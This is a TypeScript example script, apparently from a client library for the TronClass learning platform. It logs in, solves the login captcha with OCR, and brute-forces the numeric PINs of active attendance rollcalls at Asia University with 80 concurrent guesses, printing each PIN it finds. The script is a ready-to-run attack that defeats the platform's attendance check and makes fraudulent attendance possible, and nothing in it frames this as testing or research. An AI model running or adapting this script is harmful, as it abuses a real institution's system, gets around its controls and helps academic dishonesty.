import 'dotenv/config';
import { TronClass, Schools, solveCaptcha, NumberCodeNotFoundError } from '../src/index.js';

async function main() {
  const username = process.env.TRON_USER;
  const password = process.env.TRON_PASS;

  if (!username || !password) {
    throw new Error('Please set TRON_USER and TRON_PASS environment variables.');
  }

  const tc = new TronClass(Schools.ASIA_UNIVERSITY);
  console.log('Logging in...');
  await tc.login({
    username,
    password,
    ocrFunction: solveCaptcha,
  });
  console.log('Login successful!\n');

  console.log('Fetching active rollcalls...');
  const rollcalls = await tc.attendance.getActiveRollcalls();

  if (rollcalls.length === 0) {
    console.log('No active rollcalls right now.');
    return;
  }

  console.log(`Found ${rollcalls.length} active rollcalls. Brute-forcing PINs...\n`);

  for (const r of rollcalls) {
    console.log(`▶ [${r.id}] ${r.course_title} (by ${r.created_by_name})`);

    if (!r.is_number) {
      console.log('  -> Not a number-based rollcall, skipping.');
      continue;
    }

    try {
      const startedAt = Date.now();
      const result = await tc.attendance.bruteForceNumberRollcall(r.id, {
        concurrency: 80,
        shuffle: true,
        onProgress: throttle(({ tested, total, current, elapsedMs }) => {
          const pct = ((tested / total) * 100).toFixed(1);
          process.stdout.write(
            `  \r  [${tested.toString().padStart(5)}/${total}] (${pct}%) trying ${current} (${elapsedMs}ms) `,
          );
        }, 250),
      });
      process.stdout.write('\n');

      console.log(`  ✓ FOUND PIN: ${result.numberCode}`);
      console.log(`  ✓ Attempts: ${result.attempts}`);
      console.log(`  ✓ Duration: ${result.durationMs}ms (started ${Date.now() - startedAt}ms ago)`);
      console.log(`  ✓ Server response:`, result.result);
    } catch (err) {
      process.stdout.write('\n');
      if (err instanceof NumberCodeNotFoundError) {
        console.error(`  ✗ Exhausted ${err.attempts} attempts in ${err.durationMs}ms — no PIN matched.`);
      } else {
        console.error(`  ✗ Brute-force failed:`, err);
      }
    }
  }
}

function throttle<T extends unknown[]>(fn: (...args: T) => void, intervalMs: number): (...args: T) => void {
  let last = 0;
  return (...args: T) => {
    const now = Date.now();
    if (now - last >= intervalMs) {
      last = now;
      fn(...args);
    }
  };
}

main().catch(console.error);
